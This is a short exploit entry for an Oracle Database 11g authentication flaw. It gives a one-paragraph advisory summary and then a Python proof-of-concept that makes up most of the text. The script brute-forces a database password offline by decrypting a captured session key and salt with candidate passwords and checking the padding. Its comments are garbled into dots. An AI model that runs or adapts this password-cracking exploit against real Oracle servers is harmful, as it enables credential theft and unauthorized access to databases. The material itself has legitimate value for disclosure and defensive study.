source: http://www.securityfocus.com/bid/55651/info

Oracle Database is prone to a remote security-bypass vulnerability that affects the authentication protocol. 

An attacker can exploit this issue to bypass the authentication process and gain unauthorized access to the database. 

This vulnerability affects Oracle Database 11g Release 1 and 11g Release 2.


    #-*-coding:utf8 -*-
     
    import hashlib
    from Crypto.Cipher import AES
     
    def decrypt(session,salt,password):
            pass_hash = hashlib.sha1(password+salt)
     
            #......... ..... ..... .......... .. 24 ....
            key = pass_hash.digest() + '\x00\x00\x00\x00'
            decryptor = AES.new(key,AES.MODE_CBC)
            plain = decryptor.decrypt(session)
            return plain
     
    #............. ........... ...... 48 ....
    session_hex = 'EA2043CB8B46E3864311C68BDC161F8CA170363C1E6F57F3EBC6435F541A8239B6DBA16EAAB5422553A7598143E78767'
     
    #.... 10 ....
    salt_hex = 'A7193E546377EC56639E'
     
    passwords = ['test','password','oracle','demo']
     
    for password in passwords:
            session_id = decrypt(session_hex.decode('hex'),salt_hex.decode('hex'),password)
            print 'Decrypted session_id for password "%s" is %s' % (password,session_id.encode('hex'))
            if session_id[40:] == '\x08\x08\x08\x08\x08\x08\x08\x08':
                    print 'PASSWORD IS "%s"' % password
                    break